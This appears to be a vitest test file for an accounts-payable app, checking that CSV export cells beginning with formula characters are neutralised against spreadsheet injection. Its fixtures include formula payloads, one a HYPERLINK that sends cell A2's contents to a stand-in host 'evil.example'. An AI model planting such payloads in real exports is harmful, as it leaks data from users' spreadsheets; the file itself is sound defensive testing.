import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { approve, exportApproved } from "@/domain/runs/review";
import { replay } from "@/server/demo";
import { runtime } from "@/server/runtime";
import { csvCell, exportCsv } from "@/server/service";

// Audit A09: the payment-list CSV is opened in a spreadsheet; a cell that starts with = + - @ (or a tab or CR)
// would run as a formula. Reviewer names and invoice numbers come from outside, so every cell is neutralised.

describe("payment-list CSV (audit A09)", () => {
  beforeEach(() => {
    for (const k of ["DATABASE_URL", "GEMINI_API_KEY", "GEMINI_MODEL", "RESEND_API_KEY", "AP_INBOX_ADDRESS"]) vi.stubEnv(k, "");
    (globalThis as { __ps1Runtime?: unknown }).__ps1Runtime = undefined;
  });
  afterEach(() => {
    vi.unstubAllEnvs();
    (globalThis as { __ps1Runtime?: unknown }).__ps1Runtime = undefined;
  });

  it.each([
    ["=HYPERLINK(\"http://evil.example\",\"x\")", "\"'=HYPERLINK(\"\"http://evil.example\"\",\"\"x\"\")\""],
    ["+1+1", "\"'+1+1\""],
    ["-2+3", "\"'-2+3\""],
    ["@SUM(A1)", "\"'@SUM(A1)\""],
    ["\tTAB", "\"'\tTAB\""],
    ["Divya (AP)", "\"Divya (AP)\""],
    ["18880.00", "\"18880.00\""],
    [null, "\"\""],
  ])("%j -> %s", (input, out) => {
    expect(csvCell(input)).toBe(out);
  });

  it("an approver named like a formula exports as text", async () => {
    const { deps } = runtime();
    const r = await replay("S1");
    for (const w of r.work) await w(); // what after() runs in the app
    const runId = r.run_ids[0];
    const evil = "=HYPERLINK(\"http://evil.example/?x=\"&A2,\"Open\")";
    expect((await approve(deps, [runId], { actor: evil })).ok).toBe(true);
    const x = await exportApproved(deps, { actor: "Ravi (Finance)" });
    expect(x.ok).toBe(true);
    const csv = (await exportCsv(x.ok ? x.value.record.export_id : ""))!;
    expect(csv).toContain("\"'=HYPERLINK(");
    expect(csv.split("\n").slice(1).every((row) => !/(^|,)"[=+\-@]/.test(row))).toBe(true);
  });
});
